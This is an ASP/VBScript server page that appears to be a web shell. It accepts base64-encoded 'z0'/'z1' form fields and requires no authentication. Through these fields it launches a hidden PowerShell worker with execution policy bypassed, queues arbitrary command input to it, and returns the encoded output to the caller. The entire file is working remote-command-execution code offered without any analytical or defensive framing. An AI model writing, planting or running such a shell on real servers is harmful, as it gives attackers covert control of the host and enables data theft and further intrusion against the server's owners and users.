<%
Response.ContentType = "application/json"
Response.CharSet = "UTF-8"

Dim workDir, queueDir, outFile, pidFile
workDir = Server.MapPath(".")
queueDir = workDir & "\.queue"
outFile = workDir & "\.output.txt"
pidFile = workDir & "\.pid.txt"

Dim fso
Set fso = Server.CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists(queueDir) Then fso.CreateFolder(queueDir)

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    
    ' If Response.CharSet is empty, map it based on Session.CodePage
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8" ' Default safe fallback
        End Select
    End If
    
    GetCurrentCharset = charset
End Function

Function Base64Decode(byVal base64Str)
    On Error Resume Next
    If base64Str = "" Then 
        Base64Decode = ""
        Exit Function
    End If
    Dim xml, el, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set el = xml.createElement("tmp")
    el.dataType = "bin.base64"
    el.text = base64Str
    
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write el.nodeTypedValue
    stream.Position = 0
    stream.Type = 2 ' Text
    stream.CharSet = GetCurrentCharset()
    Base64Decode = stream.ReadText
    stream.Close
    If Err.Number <> 0 Then Base64Decode = base64Str
    On Error GoTo 0
End Function

Function GetTimestamp()
    Dim d
    d = Now()
    GetTimestamp = Year(d) & Right("0" & Month(d), 2) & Right("0" & Day(d), 2) & "_" & _
                   Right("0" & Hour(d), 2) & Right("0" & Minute(d), 2) & Right("0" & Second(d), 2) & _
                   "_" & Right("00" & Int(Timer * 100) Mod 100, 2)
End Function

Dim actionType, rawZ1
actionType = Base64Decode(Request.Form("z0"))
rawZ1 = Base64Decode(Request.Form("z1")) ' Keep raw to avoid double-decoding anomalies

Select Case actionType

    Case "create"
        If fso.FileExists(outFile) Then fso.DeleteFile(outFile)
        
        Dim wsh, runCmd
        Set wsh = Server.CreateObject("WScript.Shell")
        
        ' Force PowerShell execution bypass natively, calling our new engine and passing the map path
        runCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & workDir & "\worker.ps1"" """ & workDir & """"
        
        ' 0 = Hidden Window, False = Run asynchronously detached
        wsh.Run runCmd, 0, False
        Set wsh = Nothing
        
        Response.Write "{""status"":""success"",""msg"":""PowerShell Engine spawned successfully.""}"

    Case "write"
        Dim rawCmd, chunkPath, chunkStream
        rawCmd = Base64Decode(rawZ1)
        
        If Right(rawCmd, 2) <> vbCrLf And Right(rawCmd, 1) <> vbLf And Right(rawCmd, 1) <> vbCr Then
            rawCmd = rawCmd & vbCrLf
        End If
        
        chunkPath = queueDir & "\" & GetTimestamp() & "_" & Int((9999 - 1000 + 1) * Rnd + 1000) & ".txt"
        
        ' Open, write, close instantly
        Set chunkStream = fso.OpenTextFile(chunkPath, 2, True, -2)
        chunkStream.Write rawCmd
        chunkStream.Close
        
        ' CRITICAL: Free the COM pointer immediately to drop the lock!
        Set chunkStream = Nothing
        
        Response.Write "{""status"":""success"",""msg"":""Input buffer queued.""}"

    Case "read"
        Dim readContent, tsStream
        readContent = ""
        
        If fso.FileExists(outFile) Then
            On Error Resume Next
            Set tsStream = fso.OpenTextFile(outFile, 1, False, -2)
            If Err.Number = 0 Then
                If Not tsStream.AtEndOfStream Then
                    readContent = tsStream.ReadAll
                End If
                tsStream.Close
            End If
            
            ' Clear the output file immediately so next polling iteration grabs new chunks
            If readContent <> "" Then
                Set tsStream = fso.OpenTextFile(outFile, 2, True, -2)
                tsStream.Write ""
                tsStream.Close
            End If
            On Error GoTo 0
        End If
        
        Dim xml, el, b64Out
        Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
        Set el = xml.createElement("tmp")
        el.dataType = "bin.base64"
        
        If readContent <> "" Then
            Dim binStream, firstBytes
            Set binStream = Server.CreateObject("ADODB.Stream")
            binStream.Type = 2 ' Text
            binStream.CharSet = "UTF-8"
            binStream.Open
            binStream.WriteText readContent
            
            binStream.Position = 0
            binStream.Type = 1 ' Binary
            
            ' DYNAMIC BOM DETECTOR: Only skip 3 bytes if the classic UTF-8 header EF BB BF is detected
            If binStream.Size >= 3 Then
                firstBytes = binStream.Read(3)
                ' If it matches the EF BB BF hex sequence (rendered as characters or byte strings depending on platform context)
                ' We reset position based on presence verification
                binStream.Position = 0
                Dim testStream, checkStr
                Set testStream = Server.CreateObject("ADODB.Stream")
                testStream.Type = 1
                testStream.Open
                testStream.Write firstBytes
                testStream.Position = 0
                testStream.Type = 2
                testStream.CharSet = "ascii"
                checkStr = testStream.ReadText
                testStream.Close
                
                ' Fallback safe inspection: If the first characters match known BOM translation signatures
                If InStr(checkStr, "ï»¿") > 0 Then
                    binStream.Position = 3
                Else
                    binStream.Position = 0
                End If
            End If
            
            el.nodeTypedValue = binStream.Read
            binStream.Close
            b64Out = Replace(el.text, vbLf, "")
            b64Out = Replace(b64Out, vbCr, "")
        Else
            b64Out = ""
        End If
        
        Response.Write "{""status"":""success"",""msg"":""" & b64Out & """}"

    Case "stop"
        If fso.FileExists(pidFile) Then
            Dim pidStream
            Set pidStream = fso.CreateTextFile(pidFile, True)
            pidStream.Write "stopped"
            pidStream.Close
        End If
        Response.Write "{""status"":""stop"",""msg"":""Engine shutdown initiated.""}"

    Case Else
        Response.Write "{""status"":""fail"",""msg"":""Invalid action""}"

End Select

Set fso = Nothing
%>